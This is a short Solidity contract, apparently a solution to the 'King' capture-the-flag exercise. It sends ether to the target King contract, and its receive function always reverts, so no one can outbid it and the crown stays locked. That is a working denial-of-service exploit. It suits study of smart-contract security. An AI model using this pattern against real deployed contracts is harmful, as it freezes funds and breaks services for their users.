// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }


    receive() external payable {
        // require(msg.sender != contractAddress, "Your money's no good here!");
        revert();
    }

    function hackContract() external {
        // Code me!
        (bool success,) = address(contractAddress).call{value: 1.1 ether}("");
        require(success, "Failed to send Ether");
    }
}
